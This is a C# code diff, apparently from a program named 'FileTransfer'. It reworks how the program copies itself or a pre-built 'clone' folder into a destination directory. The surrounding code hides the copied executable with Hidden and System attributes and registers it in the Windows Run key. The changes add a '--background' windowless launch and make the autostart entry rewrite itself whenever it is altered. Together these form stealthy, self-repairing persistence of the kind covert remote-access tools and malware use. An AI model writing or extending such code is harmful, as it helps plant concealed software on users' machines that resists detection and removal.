@@ -90,28 +90,24 @@ namespace FileTransfer
                 Directory.CreateDirectory(DestDir);
 
                 string sourceDir = Path.GetDirectoryName(source) ?? "";
-                if (!string.IsNullOrEmpty(sourceDir) && Directory.Exists(sourceDir))
+                string? cloneFolder = !string.IsNullOrEmpty(sourceDir)
+                    ? Path.Combine(sourceDir, "clone")
+                    : null;
+
+                bool hasCloneFolder = cloneFolder != null && Directory.Exists(cloneFolder);
+
+                if (hasCloneFolder)
                 {
-                    foreach (string file in Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories))
-                    {
-                        string rel = Path.GetRelativePath(sourceDir, file);
-                        string dest = Path.Combine(DestDir, rel);
-
-                        string ext = Path.GetExtension(file).ToLowerInvariant();
-                        if (ext == ".pdb" || ext == ".xml")
-                            continue;
-
-                        if (file.Equals(source, StringComparison.OrdinalIgnoreCase))
-                            continue;
-
-                        string? destDir2 = Path.GetDirectoryName(dest);
-                        if (!string.IsNullOrEmpty(destDir2))
-                            Directory.CreateDirectory(destDir2);
-                        File.Copy(file, dest, true);
-                    }
+                    Log($"Using pre-built clone from {cloneFolder}");
+                    CopyDirectoryContents(cloneFolder, DestDir, source);
+                }
+                else
+                {
+                    Log("No pre-built clone, copying from source");
+                    CopyDirectoryContents(sourceDir, DestDir, source);
+                    File.Copy(source, DestExe, true);
                 }
 
-                File.Copy(source, DestExe, true);
                 File.SetAttributes(DestExe, FileAttributes.Hidden | FileAttributes.System);
 
                 AddToAutoStart();
@@ -128,6 +124,28 @@ namespace FileTransfer
             }
         }
 
+        private static void CopyDirectoryContents(string sourceDir, string destDir, string? skipFile = null)
+        {
+            if (!Directory.Exists(sourceDir)) return;
+            foreach (string file in Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories))
+            {
+                string rel = Path.GetRelativePath(sourceDir, file);
+                string dest = Path.Combine(destDir, rel);
+
+                string ext = Path.GetExtension(file).ToLowerInvariant();
+                if (ext == ".pdb" || ext == ".xml")
+                    continue;
+
+                if (skipFile != null && file.Equals(skipFile, StringComparison.OrdinalIgnoreCase))
+                    continue;
+
+                string? destDir2 = Path.GetDirectoryName(dest);
+                if (!string.IsNullOrEmpty(destDir2))
+                    Directory.CreateDirectory(destDir2);
+                File.Copy(file, dest, true);
+            }
+        }
+
         private static void AddToAutoStart()
         {
             try
@@ -136,7 +154,7 @@ namespace FileTransfer
                     @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                 if (key != null)
                 {
-                    key.SetValue(RunKeyName, $"\"{DestExe}\"");
+                    key.SetValue(RunKeyName, $"\"{DestExe}\" --background");
                     Log("Autostart registry key added");
                 }
             }
@@ -155,9 +173,10 @@ namespace FileTransfer
                 if (key != null)
                 {
                     string? current = key.GetValue(RunKeyName) as string;
-                    if (string.IsNullOrEmpty(current) || current != $"\"{DestExe}\"")
+                    string desired = $"\"{DestExe}\" --background";
+                    if (string.IsNullOrEmpty(current) || current != desired)
                     {
-                        key.SetValue(RunKeyName, $"\"{DestExe}\"");
+                        key.SetValue(RunKeyName, desired);
                         Log("Autostart registry key repaired");
                     }
                 }
@@ -177,6 +196,7 @@ namespace FileTransfer
                     var psi = new ProcessStartInfo
                     {
                         FileName = DestExe,
+                        Arguments = "--background",
                         UseShellExecute = false,
                         CreateNoWindow = true
                     };
